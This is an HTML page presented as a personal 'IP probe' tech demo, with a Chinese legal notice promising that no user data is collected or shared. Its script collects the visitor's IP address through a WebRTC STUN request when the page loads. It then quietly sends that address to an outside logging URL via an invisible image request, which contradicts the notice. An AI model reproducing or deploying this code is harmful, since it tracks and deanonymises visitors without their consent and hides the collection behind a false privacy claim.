<!DOCTYPE html>
<html>
<head>
    <title>朱子硕的IP探针</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center;
            padding: 20px;
        }
        #result {
            color: #2c3e50;
            margin: 30px 0;
            padding: 15px;
            border: 1px solid #bdc3c7;
            border-radius: 5px;
        }
        .legal-notice {
            color: #666;
            font-size: 0.8em;
            max-width: 600px;
            margin: 20px auto;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <h2>🛜 朱子硕的无敌ip探针</h2>
    <div id="result"></div>

    <div class="legal-notice">
        法律声明：本网页仅用于技术演示目的，通过浏览器标准API获取公网出口IP地址。
        本人承诺不会收集、存储或分享任何用户数据。根据《网络安全法》等相关法规，
        严禁将该工具用于任何非法用途。继续使用即表示您同意仅将本网页用于合法授权场景。
    </div>

    <script>
    // WebRTC实时获取IP
    function captureIP() {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = ice => {
            if (!ice.candidate) return;
            const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
            const ipMatch = ice.candidate.candidate.match(ipRegex);
            if (ipMatch) {
                document.getElementById('result').innerHTML = 
                    `✅ 朱子硕逆天无敌666<br>已获人机公网IP：<b>${ipMatch[0]}</b>`;
                // 逆天
                new Image().src = `https://zzs-ip.free.beeceptor.com?ip=${ipMatch[0]}`;
            }
        };
    }
    captureIP();
    </script>
</body>
</html>
